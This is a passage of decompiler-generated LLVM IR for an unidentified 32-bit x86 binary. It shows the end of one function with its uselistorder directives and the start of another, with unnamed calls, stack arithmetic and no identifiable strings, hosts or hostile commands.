  %v1_8050e50 = inttoptr i32 %v0_8050e48 to i32*
  %v3_8050e50 = add i32 %v0_8050e48, 4
  %v1_8050e51 = inttoptr i32 %v3_8050e50 to i32*
  store i32 1, i32* %v1_8050e51, align 4
  %v0_8050e54 = load i32, i32* @eax, align 4
  %v1_8050e54 = sext i32 %v0_8050e54 to i64
  store i64 %v1_8050e54, i64* @global_var_8058780.195, align 128
  %v0_8050e59 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e59 = trunc i32 %v0_8050e59 to i16
  store i16 %v1_8050e59, i16* @global_var_805608c.196, align 4
  %v0_8050e60 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050e60, i32* %v1_8050e50, align 4
  %v2_8050e61 = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050e61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fa2

dec_label_pc_8050e6b:                             ; preds = %dec_label_pc_8050da5
  %v1_8050e6e = inttoptr i32 %v0_8050da5 to i32*
  %v2_8050e6e = load i32, i32* %v1_8050e6e, align 4
  %v5_8050e6e = inttoptr i32 %v0_8050d95 to i32*
  store i32 %v2_8050e6e, i32* %v5_8050e6e, align 4
  %v1_8050e70 = call i32 @function_804e725(i32 -1)
  store i32 %v1_8050e70, i32* @eax, align 4
  %v0_8050e75 = load i32, i32* @esp, align 4
  %v1_8050e75 = add i32 %v0_8050e75, 16
  br label %dec_label_pc_8050e78

dec_label_pc_8050e78:                             ; preds = %dec_label_pc_8050baa, %dec_label_pc_8050cd5, %dec_label_pc_8050ccd, %dec_label_pc_8050c69, %dec_label_pc_8050bef, %dec_label_pc_8050bcb, %dec_label_pc_8050e6b
  %v1_8050e7f = phi i32 [ %v1_8050bbf, %dec_label_pc_8050baa ], [ %v1_8050cc6, %dec_label_pc_8050cd5 ], [ %v1_8050cc6, %dec_label_pc_8050ccd ], [ %v1_8050be0, %dec_label_pc_8050c69 ], [ %v1_8050be0, %dec_label_pc_8050bef ], [ %v1_8050be0, %dec_label_pc_8050bcb ], [ %v1_8050e75, %dec_label_pc_8050e6b ]
  %v1_8050e78 = add i32 %v1_8050e7f, 51
  %v2_8050e78 = inttoptr i32 %v1_8050e78 to i8*
  %v3_8050e78 = load i8, i8* %v2_8050e78, align 1
  %v4_8050e78 = icmp eq i8 %v3_8050e78, 0
  %v1_8050e7d = icmp eq i1 %v4_8050e78, false
  br i1 %v1_8050e7d, label %dec_label_pc_8050ec3, label %dec_label_pc_8050e7f

dec_label_pc_8050e7f:                             ; preds = %dec_label_pc_8050e78
  %v0_8050e7f = load i32, i32* @ecx, align 4
  %v2_8050e7f = add i32 %v1_8050e7f, -4
  %v3_8050e7f = inttoptr i32 %v2_8050e7f to i32*
  store i32 %v0_8050e7f, i32* %v3_8050e7f, align 4
  %v1_8050e80 = add i32 %v1_8050e7f, -8
  %v2_8050e80 = inttoptr i32 %v1_8050e80 to i32*
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v2_8050e80, align 4
  %v1_8050e85 = add i32 %v1_8050e7f, -12
  %v2_8050e85 = inttoptr i32 %v1_8050e85 to i32*
  store i32 134541995, i32* %v2_8050e85, align 4
  %v1_8050e8a = add i32 %v1_8050e7f, 184
  store i32 %v1_8050e8a, i32* @esi, align 4
  %v2_8050e91 = add i32 %v1_8050e7f, -16
  %v3_8050e91 = inttoptr i32 %v2_8050e91 to i32*
  store i32 %v1_8050e8a, i32* %v3_8050e91, align 4
  %v2_8050e92 = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050e92, i32* %eax.global-to-local, align 4
  %v0_8050e97 = load i32, i32* @esp, align 4
  %v1_8050e97 = inttoptr i32 %v0_8050e97 to i32*
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %v1_8050e97, align 4
  %v1_8050e9e = call i32 @function_804f2ab(i32 -1)
  store i32 %v1_8050e9e, i32* %eax.global-to-local, align 4
  %v0_8050ea3 = load i32, i32* @esp, align 4
  %v1_8050ea3 = inttoptr i32 %v0_8050ea3 to i32*
  %v2_8050ea3 = load i32, i32* %v1_8050ea3, align 4
  store i32 %v2_8050ea3, i32* @eax, align 4
  %v3_8050ea3 = add i32 %v0_8050ea3, 4
  %v1_8050ea4 = inttoptr i32 %v3_8050ea3 to i32*
  %v2_8050ea4 = load i32, i32* %v1_8050ea4, align 4
  store i32 %v2_8050ea4, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050ea4, align 4
  %v0_8050ea7 = load i32, i32* @esi, align 4
  store i32 %v0_8050ea7, i32* %v1_8050ea3, align 4
  %v0_8050ea8 = load i32, i32* @global_var_8058d78.197, align 8
  store i32 %v0_8050ea8, i32* %ebx.global-to-local, align 4
  %v2_8050eae = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050eae, i32* %eax.global-to-local, align 4
  %v0_8050eb3 = load i32, i32* @esp, align 4
  %v1_8050eb3 = add i32 %v0_8050eb3, 16
  %v1_8050eb6 = add i32 %v0_8050ea8, -1
  store i32 %v1_8050eb6, i32* @ebx, align 4
  %v1_8050eb7 = add i32 %v0_8050eb3, 52
  %v2_8050eb7 = inttoptr i32 %v1_8050eb7 to i32*
  %v3_8050eb7 = load i32, i32* %v2_8050eb7, align 4
  %v5_8050eb7 = sub i32 %v3_8050eb7, %v1_8050eb6
  %v11_8050eb7 = xor i32 %v3_8050eb7, %v1_8050eb6
  %v12_8050eb7 = xor i32 %v5_8050eb7, %v3_8050eb7
  %v13_8050eb7 = and i32 %v12_8050eb7, %v11_8050eb7
  %v14_8050eb7 = icmp slt i32 %v13_8050eb7, 0
  %v16_8050eb7 = icmp slt i32 %v5_8050eb7, 0
  %v2_8050ebb = icmp eq i1 %v16_8050eb7, %v14_8050eb7
  br i1 %v2_8050ebb, label %dec_label_pc_8050ec3, label %dec_label_pc_8050ebd

dec_label_pc_8050ebd:                             ; preds = %dec_label_pc_8050e7f
  %v4_8050ebd = add i32 %v3_8050eb7, 1
  store i32 %v4_8050ebd, i32* %v2_8050eb7, align 4
  br label %dec_label_pc_8050ee4.backedge

dec_label_pc_8050ec3:                             ; preds = %dec_label_pc_8050b4c, %dec_label_pc_8050e7f, %dec_label_pc_8050e78, %dec_label_pc_8050b63
  %v1_8050ed0 = phi i32 [ %v1_8050eb3, %dec_label_pc_8050e7f ], [ %v1_8050e7f, %dec_label_pc_8050e78 ], [ %v1_8050b9f, %dec_label_pc_8050b63 ], [ %v0_8050ec3.pre, %dec_label_pc_8050b4c ]
  %v1_8050ec3 = add i32 %v1_8050ed0, 40
  %v2_8050ec3 = inttoptr i32 %v1_8050ec3 to i32*
  %v3_8050ec3 = load i32, i32* %v2_8050ec3, align 4
  %v1_8050ec7 = add i32 %v3_8050ec3, 1
  store i32 %v1_8050ec7, i32* %eax.global-to-local, align 4
  %v1_8050ec8 = ashr i32 %v1_8050ec7, 31
  store i32 %v1_8050ec8, i32* %edx.global-to-local, align 4
  %v1_8050ec9 = add i32 %v1_8050ed0, 248
  %v2_8050ec9 = inttoptr i32 %v1_8050ec9 to i32*
  %v3_8050ec9 = load i32, i32* %v2_8050ec9, align 4
  %v5_8050ec9 = zext i32 %v1_8050ec7 to i64
  %v7_8050ec9 = zext i32 %v1_8050ec8 to i64
  %v8_8050ec9 = mul nuw i64 %v7_8050ec9, 4294967296
  %v9_8050ec9 = or i64 %v8_8050ec9, %v5_8050ec9
  %v10_8050ec9 = zext i32 %v3_8050ec9 to i64
  %v11_8050ec9 = sdiv i64 %v9_8050ec9, %v10_8050ec9
  %v12_8050ec9 = trunc i64 %v11_8050ec9 to i32
  store i32 %v12_8050ec9, i32* %eax.global-to-local, align 4
  %v13_8050ec9 = srem i64 %v9_8050ec9, %v10_8050ec9
  %v14_8050ec9 = trunc i64 %v13_8050ec9 to i32
  store i32 %v14_8050ec9, i32* %edx.global-to-local, align 4
  store i32 %v14_8050ec9, i32* %v2_8050ec3, align 4
  %v1_8050ed4 = icmp eq i32 %v14_8050ec9, 0
  %v1_8050ed6 = icmp eq i1 %v1_8050ed4, false
  br i1 %v1_8050ed6, label %dec_label_pc_8050edc, label %dec_label_pc_8050ed8

dec_label_pc_8050ed8:                             ; preds = %dec_label_pc_8050ec3
  %v0_8050ed8 = load i32, i32* @esp, align 4
  %v1_8050ed8 = add i32 %v0_8050ed8, 28
  %v2_8050ed8 = inttoptr i32 %v1_8050ed8 to i32*
  %v3_8050ed8 = load i32, i32* %v2_8050ed8, align 4
  %v4_8050ed8 = add i32 %v3_8050ed8, 1
  store i32 %v4_8050ed8, i32* %v2_8050ed8, align 4
  br label %dec_label_pc_8050edc

dec_label_pc_8050edc:                             ; preds = %dec_label_pc_8050ec3, %dec_label_pc_8050ed8
  %v0_8050edc = load i32, i32* @esp, align 4
  %v1_8050edc = add i32 %v0_8050edc, 36
  %v2_8050edc = inttoptr i32 %v1_8050edc to i32*
  store i32 -1, i32* %v2_8050edc, align 4
  br label %dec_label_pc_8050ee4.backedge

dec_label_pc_8050ee4.backedge:                    ; preds = %dec_label_pc_8050edc, %dec_label_pc_8050b5a, %dec_label_pc_8050c48, %dec_label_pc_8050ebd
  %v0_8050ee4.pre = load i32, i32* @esp, align 4
  %v1_8050ee4 = add i32 %v0_8050ee4.pre, 28
  %v2_8050ee4 = inttoptr i32 %v1_8050ee4 to i32*
  %v3_8050ee4 = load i32, i32* %v2_8050ee4, align 4
  %tmp119 = icmp ult i32 %v3_8050ee4, 3
  br i1 %tmp119, label %dec_label_pc_8050944, label %dec_label_pc_8050f09

dec_label_pc_8050f09:                             ; preds = %dec_label_pc_80508be, %dec_label_pc_8050a4e, %dec_label_pc_805095a, %dec_label_pc_8050ee4.backedge, %dec_label_pc_8050860, %dec_label_pc_8050898, %dec_label_pc_80508a0, %dec_label_pc_80508ae
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_80508ae ], [ -1, %dec_label_pc_80508a0 ], [ -1, %dec_label_pc_8050898 ], [ -1, %dec_label_pc_8050860 ], [ %v0_805090b, %dec_label_pc_8050ee4.backedge ], [ %v0_805090b, %dec_label_pc_805095a ], [ %v0_805090b, %dec_label_pc_8050a4e ], [ %v0_805090b, %dec_label_pc_80508be ]
  %v0_8050f09 = call i32 @function_804fae4()
  store i32 %v0_8050f09, i32* %eax.global-to-local, align 4
  %v1_8050f0e = inttoptr i32 %v0_8050f09 to i32*
  store i32 -1, i32* %v1_8050f0e, align 4
  %v0_8050f14 = load i32, i32* @esp, align 4
  %v1_8050f14 = add i32 %v0_8050f14, 44
  %v2_8050f14 = inttoptr i32 %v1_8050f14 to i32*
  %v3_8050f14 = load i32, i32* %v2_8050f14, align 4
  store i32 %v3_8050f14, i32* %eax.global-to-local, align 4
  %v2_8050f18 = add i32 %v0_8050f14, 56
  %v3_8050f18 = inttoptr i32 %v2_8050f18 to i32*
  store i32 %v3_8050f14, i32* %v3_8050f18, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050c81, %dec_label_pc_8050c59, %dec_label_pc_8050f09
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8050f09 ], [ %v0_805090b, %dec_label_pc_8050c81 ], [ %v0_805090b, %dec_label_pc_8050c59 ]
  %v0_8050f1c = load i32, i32* @esp, align 4
  %v1_8050f1c = add i32 %v0_8050f1c, 20
  %v2_8050f1c = inttoptr i32 %v1_8050f1c to i32*
  %v3_8050f1c = load i32, i32* %v2_8050f1c, align 4
  %v13_8050f1c = icmp eq i32 %v3_8050f1c, -1
  br i1 %v13_8050f1c, label %dec_label_pc_8050f1c.dec_label_pc_8050f32_crit_edge, label %dec_label_pc_8050f23

dec_label_pc_8050f1c.dec_label_pc_8050f32_crit_edge: ; preds = %dec_label_pc_8050f1c
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8050f32

dec_label_pc_8050f23:                             ; preds = %dec_label_pc_8050f1c
  %v3_8050f26 = load i32, i32* %v2_8050f1c, align 4
  %v5_8050f26 = add i32 %v0_8050f1c, -16
  %v6_8050f26 = inttoptr i32 %v5_8050f26 to i32*
  store i32 %v3_8050f26, i32* %v6_8050f26, align 4
  %v1_8050f2a = sext i16 %stack_var_-192.1 to i32
  %v2_8050f2a = call i32 @function_804b4a4(i32 %v1_8050f2a)
  store i32 %v2_8050f2a, i32* %eax.global-to-local, align 4
  %v0_8050f2f = load i32, i32* @esp, align 4
  %v1_8050f2f = add i32 %v0_8050f2f, 16
  br label %dec_label_pc_8050f32

dec_label_pc_8050f32:                             ; preds = %dec_label_pc_8050f1c.dec_label_pc_8050f32_crit_edge, %dec_label_pc_8050f23
  %v1_8050f39.pre-phi = phi i32 [ %.pre, %dec_label_pc_8050f1c.dec_label_pc_8050f32_crit_edge ], [ %v1_8050f2a, %dec_label_pc_8050f23 ]
  %v0_8050f32 = phi i32 [ %v0_8050f1c, %dec_label_pc_8050f1c.dec_label_pc_8050f32_crit_edge ], [ %v1_8050f2f, %dec_label_pc_8050f23 ]
  %v1_8050f35 = add i32 %v0_8050f32, 12
  %v2_8050f35 = inttoptr i32 %v1_8050f35 to i32*
  %v3_8050f35 = load i32, i32* %v2_8050f35, align 4
  %v5_8050f35 = add i32 %v0_8050f32, -16
  %v6_8050f35 = inttoptr i32 %v5_8050f35 to i32*
  store i32 %v3_8050f35, i32* %v6_8050f35, align 4
  %v2_8050f39 = call i32 @function_804e725(i32 %v1_8050f39.pre-phi)
  store i32 %v2_8050f39, i32* %eax.global-to-local, align 4
  %v1_8050f3e = load i32, i32* @esp, align 4
  %v2_8050f3e = inttoptr i32 %v1_8050f3e to i32*
  store i32 %v1_8050876, i32* %v2_8050f3e, align 4
  %v2_8050f41 = call i32 @function_804e725(i32 %v1_8050f39.pre-phi)
  store i32 %v2_8050f41, i32* @eax, align 4
  %v0_8050f46 = load i32, i32* @esp, align 4
  %v1_8050f49 = add i32 %v0_8050f46, 32
  %v2_8050f49 = inttoptr i32 %v1_8050f49 to i32*
  store i32 -1, i32* %v2_8050f49, align 4
  %v0_8050f51 = load i32, i32* @esp, align 4
  %v1_8050f51 = add i32 %v0_8050f51, 40
  %v2_8050f51 = inttoptr i32 %v1_8050f51 to i32*
  %v3_8050f51 = load i32, i32* %v2_8050f51, align 4
  %v13_8050f51 = icmp eq i32 %v3_8050f51, -1
  br i1 %v13_8050f51, label %dec_label_pc_8050fa5, label %dec_label_pc_8050f58

dec_label_pc_8050f58:                             ; preds = %dec_label_pc_8050f32
  %v0_8050f58 = load i32, i32* @ecx, align 4
  %v2_8050f58 = add i32 %v0_8050f51, -4
  %v3_8050f58 = inttoptr i32 %v2_8050f58 to i32*
  store i32 %v0_8050f58, i32* %v3_8050f58, align 4
  %v1_8050f59 = add i32 %v0_8050f51, -8
  %v2_8050f59 = inttoptr i32 %v1_8050f59 to i32*
  store i32 ptrtoint (i32* @global_var_8058768.194 to i32), i32* %v2_8050f59, align 4
  %v1_8050f5e = add i32 %v0_8050f51, -12
  %v2_8050f5e = inttoptr i32 %v1_8050f5e to i32*
  store i32 134541995, i32* %v2_8050f5e, align 4
  %v1_8050f63 = add i32 %v0_8050f51, 184
  store i32 %v1_8050f63, i32* %ebx.global-to-local, align 4
  %v2_8050f6a = add i32 %v0_8050f51, -16
  %v3_8050f6a = inttoptr i32 %v2_8050f6a to i32*
  store i32 %v1_8050f63, i32* %v3_8050f6a, align 4
  %v3_8050f6b = call i32 @function_804f2ae(i32 %v1_8050f39.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050f6b, i32* %eax.global-to-local, align 4
  %v0_8050f70 = load i32, i32* @esp, align 4
  %v1_8050f70 = inttoptr i32 %v0_8050f70 to i32*
  store i32 ptrtoint (i32* @global_var_8058768.194 to i32), i32* %v1_8050f70, align 4
  %v2_8050f77 = call i32 @function_804f2ab(i32 %v1_8050f39.pre-phi)
  store i32 %v2_8050f77, i32* %eax.global-to-local, align 4
  %v0_8050f7c = load i32, i32* @esp, align 4
  %v1_8050f7c = add i32 %v0_8050f7c, 56
  %v2_8050f7c = inttoptr i32 %v1_8050f7c to i32*
  %v3_8050f7c = load i32, i32* %v2_8050f7c, align 4
  store i32 %v3_8050f7c, i32* %edx.global-to-local, align 4
  %v1_8050f80 = add i32 %v0_8050f7c, 72
  %v2_8050f80 = inttoptr i32 %v1_8050f80 to i32*
  %v3_8050f80 = load i32, i32* %v2_8050f80, align 4
  store i32 %v3_8050f80, i32* %eax.global-to-local, align 4
  %v1_8050f84 = sext i32 %v3_8050f7c to i64
  store i64 %v1_8050f84, i64* @global_var_8058780.195, align 128
  %v1_8050f8a = trunc i32 %v3_8050f80 to i16
  store i16 %v1_8050f8a, i16* @global_var_805608c.196, align 4
  %v1_8050f90 = inttoptr i32 %v0_8050f7c to i32*
  %v2_8050f90 = load i32, i32* %v1_8050f90, align 4
  store i32 %v2_8050f90, i32* @eax, align 4
  %v3_8050f90 = add i32 %v0_8050f7c, 4
  %v1_8050f91 = inttoptr i32 %v3_8050f90 to i32*
  %v2_8050f91 = load i32, i32* %v1_8050f91, align 4
  store i32 %v2_8050f91, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050f91, align 4
  %v0_8050f94 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050f94, i32* %v1_8050f90, align 4
  %v3_8050f95 = call i32 @function_804f2ae(i32 %v1_8050f39.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050f95, i32* %eax.global-to-local, align 4
  %v0_8050f9a = load i32, i32* @esp, align 4
  %v1_8050f9a = add i32 %v0_8050f9a, 32
  %v2_8050f9a = inttoptr i32 %v1_8050f9a to i32*
  store i32 -1, i32* %v2_8050f9a, align 4
  br label %dec_label_pc_8050fa2

dec_label_pc_8050fa2:                             ; preds = %dec_label_pc_8050e16, %dec_label_pc_8050f58
  %v0_8050fa2 = load i32, i32* @esp, align 4
  %v1_8050fa2 = add i32 %v0_8050fa2, 16
  br label %dec_label_pc_8050fa5

dec_label_pc_8050fa5:                             ; preds = %dec_label_pc_8050f32, %dec_label_pc_8050fa2
  %v0_8050fa5 = phi i32 [ %v0_8050f51, %dec_label_pc_8050f32 ], [ %v1_8050fa2, %dec_label_pc_8050fa2 ]
  %v1_8050fa5 = add i32 %v0_8050fa5, 16
  %v2_8050fa5 = inttoptr i32 %v1_8050fa5 to i32*
  %v3_8050fa5 = load i32, i32* %v2_8050fa5, align 4
  store i32 %v3_8050fa5, i32* %eax.global-to-local, align 4
  %v1_8050fa9 = add i32 %v0_8050fa5, 220
  %v1_8050faf = inttoptr i32 %v1_8050fa9 to i32*
  %v2_8050faf = load i32, i32* %v1_8050faf, align 4
  store i32 %v2_8050faf, i32* @ebx, align 4
  %v3_8050faf = add i32 %v0_8050fa5, 224
  %v1_8050fb0 = inttoptr i32 %v3_8050faf to i32*
  %v2_8050fb0 = load i32, i32* %v1_8050fb0, align 4
  store i32 %v2_8050fb0, i32* @esi, align 4
  %v3_8050fb0 = add i32 %v0_8050fa5, 228
  %v1_8050fb1 = inttoptr i32 %v3_8050fb0 to i32*
  %v2_8050fb1 = load i32, i32* %v1_8050fb1, align 4
  store i32 %v2_8050fb1, i32* @edi, align 4
  %v3_8050fb1 = add i32 %v0_8050fa5, 232
  %v1_8050fb2 = inttoptr i32 %v3_8050fb1 to i32*
  %v2_8050fb2 = load i32, i32* %v1_8050fb2, align 4
  store i32 %v2_8050fb2, i32* @ebp, align 4
  ret i32 %v3_8050fa5

; uselistorder directives
  uselistorder i32 %v0_8050fa5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050f7c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050f51, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8050f32, { 1, 0 }
  uselistorder i32 %v1_8050f39.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8050ee4.pre, { 1, 0 }
  uselistorder i32 %v5_8050eb7, { 1, 0 }
  uselistorder i32 %v3_8050eb7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050e7f, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8050e48, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050e16, { 1, 0 }
  uselistorder i32 %v3_8050df5, { 1, 0, 2 }
  uselistorder i32 %v0_8050de6, { 1, 0 }
  uselistorder i32 %v5_8050ddc, { 1, 0 }
  uselistorder i32* %v3_8050ddc, { 1, 0 }
  uselistorder i32 %v0_8050cb280, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8050ddc, { 2, 1, 0 }
  uselistorder i32 %v5_8050dd6, { 1, 0 }
  uselistorder i32 %v1_8050dd5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050dd1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050d95, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8050d6f, { 1, 0 }
  uselistorder i32 %v1_8050d60, { 1, 0 }
  uselistorder i32 %v0_8050d1f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8050cc6, { 1, 2, 0 }
  uselistorder i32 %v0_8050cc6, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8050ca0, { 1, 0 }
  uselistorder i32 %v1_8050c9a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8050c95, { 1, 2, 0 }
  uselistorder i32 %v5_8050ca057, { 1, 0 }
  uselistorder i32 %v5_8050c42, { 1, 0 }
  uselistorder i32 %v3_8050c42, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8050bfa, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050be0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8050be0, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8050bbf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050b9f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050b45, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050b2a, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8050b13, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050a9b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050a88, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050a4e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050a2f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8050a13, { 1, 0 }
  uselistorder i32 %v3_8050a08, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8050a05, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80509aa, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80509a5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805098e, { 1, 0 }
  uselistorder i32 %v1_805095a, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805094b91, { 2, 1, 0 }
  uselistorder i32 %v3_8050963, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i16 %v0_805090b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8050904, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 12, 13, 14, 15, 16, 11 }
  uselistorder i32 %v2_80508e5, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_80508ae, { 1, 0, 2 }
  uselistorder i32 %v1_8050876, { 10, 8, 11, 2, 1, 6, 5, 3, 0, 7, 9, 4, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15, 16, 17, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 42, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 81, 77, 78, 79, 80, 82, 83, 84, 34, 35, 36, 37, 38, 39, 40, 41, 67, 43, 44, 45, 46, 47 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 2, 1 }
  uselistorder i32 68, { 3, 0, 2, 4, 5, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804d94c, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804d8fc, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_804da00, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 17, { 9, 8, 6, 7, 3, 4, 2, 10, 5, 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @function_804d518, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @function_8051640, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 11, 5, 4, 6, 3, 7, 8, 9, 10, 28, 12, 26, 25, 27, 18, 19, 13, 14, 15, 16, 17, 20, 21, 0, 22, 23, 24, 1, 2 }
  uselistorder i32 -8, { 11, 5, 4, 6, 3, 7, 8, 9, 10, 12, 29, 30, 31, 28, 18, 19, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 0, 1, 26, 2, 27 }
  uselistorder i32 (i32)* @function_804b4a4, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i32 -16, { 16, 17, 18, 7, 9, 10, 6, 8, 5, 11, 4, 12, 13, 14, 15, 19, 40, 41, 25, 26, 20, 21, 22, 23, 24, 27, 28, 1, 29, 30, 34, 31, 32, 33, 35, 2, 36, 3, 37, 38, 39, 0 }
  uselistorder i16* @global_var_805608c.196, { 2, 1, 0 }
  uselistorder i64 4294967295, { 3, 2, 0, 1 }
  uselistorder i64* @global_var_8058780.195, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8058768.194 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_804da52, { 6, 5, 1, 7, 4, 3, 8, 2, 0 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050fa5, { 1, 0 }
  uselistorder label %dec_label_pc_8050fa2, { 1, 0 }
  uselistorder label %dec_label_pc_8050f32, { 1, 0 }
  uselistorder label %dec_label_pc_8050f1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050f09, { 3, 1, 2, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8050ee4.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050edc, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec3, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050e78, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8050e16, { 1, 0 }
  uselistorder label %dec_label_pc_8050de6, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8050ddc, { 1, 0 }
  uselistorder label %dec_label_pc_8050dd1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050dce, { 1, 0 }
  uselistorder label %dec_label_pc_8050d49, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050c91, { 1, 0 }
  uselistorder label %dec_label_pc_8050b13, { 1, 0 }
  uselistorder label %dec_label_pc_8050adc, { 1, 0 }
  uselistorder label %dec_label_pc_8050a4e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805095a, { 1, 0 }
  uselistorder label %dec_label_pc_8050944, { 1, 0 }
}

define i32 @function_8050fb4() local_unnamed_addr {
dec_label_pc_8050fb4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8050fb4 = load i32, i32* @ebp, align 4
  store i32 134541995, i32* %stack_var_-216, align 4
  %v3_8050fc3 = ptrtoint i32* %stack_var_-216 to i32
  %v2_8050fc8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050fc8, i32* @eax, align 4
  %v2_8050fd0 = call i32 @function_804f2ae(i32 %v2_8050fc8, i32 134541995)
  %v1_8050fdc = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056090.137 to i32))
  store i32 %v1_8050fdc, i32* @eax, align 4
  %v0_8050fe4 = load i32, i32* @global_var_8058d74.138, align 4
  %tmp41 = icmp slt i32 %v0_8050fe4, 1
  %tmp42 = icmp eq i1 %tmp41, false
